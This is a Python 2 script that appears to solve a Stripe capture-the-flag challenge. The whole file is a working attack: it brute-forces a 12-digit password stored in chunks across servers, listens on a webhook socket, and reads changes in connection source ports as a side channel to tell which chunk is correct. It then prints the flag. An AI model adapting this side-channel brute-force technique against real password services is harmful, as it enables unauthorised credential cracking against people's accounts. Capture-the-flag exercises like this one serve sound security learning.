import socket
import urllib2

DEFAULT_SOCKET_OFFSET = 1
PREV_PORT = 0
PASSDB_HOST = 'https://level08-4.stripe-ctf.com/user-xlbtcchrdo/'
WEBHOOK_PORT = 15834
WEBHOOK_HOST = 'level02-2.stripe-ctf.com'
WEBHOOK = WEBHOOK_HOST + ':' + str(WEBHOOK_PORT)

def last_active_chunk_server(previous_port, current_port):
    if (previous_port > 0):
        return current_port - (previous_port + DEFAULT_SOCKET_OFFSET)

    return 0

def get_previous_port():
        global PREV_PORT
        return PREV_PORT

def set_previous_port(port):
        global PREV_PORT
        PREV_PORT = port

def webhook_listen(sock):
    conn, addr = sock.accept()
    current_port = addr[1]
    previous_port = get_previous_port()
    chunk_server = last_active_chunk_server(previous_port, current_port)
    set_previous_port(current_port)
    success = 0
    while 1:
        data = conn.recv(1024)
        if not data: break
        conn.send(data)
        if (data.find('{"success": true}') > 0):
            success = 1
    conn.close()
    return (chunk_server, success)

def request(url, password, webhook):
    data = '{"password": "' + password + '", "webhooks": ["' + webhook + '"]}'
    req = urllib2.Request(url, data)
    response = urllib2.urlopen(req)
    the_page = response.read()

def init_starting_port(sock):
    request(PASSDB_HOST, '000000000000', WEBHOOK)
    webhook_listen(sock)

def get_password_from_parts(parts):
    return "".join(parts)

def next_password(password_parts, chunk):
    password_chunk = int(password_parts[chunk-1])
    password_chunk += 1
    password_chunk = str(password_chunk)
    password_parts[chunk-1] = ("0" * (3-password_chunk.__len__())) + password_chunk
    return password_parts

password_parts = ["000","000","000","000"]
HOST = ''
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.bind((HOST, WEBHOOK_PORT))
s.listen(1)
old_chunk = -1
init_starting_port(s)
while 1:
    current_password = get_password_from_parts(password_parts)
    request(PASSDB_HOST, current_password, WEBHOOK)
    (chunk_server1, success) = webhook_listen(s)

    if (chunk_server1 != old_chunk):
       old_chunk = chunk_server1
       continue
    else:
       old_chunk = chunk_server1

    print chunk_server1, " ", current_password

    if (success == 1):
        print "The flag is: ", current_password
        break
    else:
        password_parts = next_password(password_parts, chunk_server1)
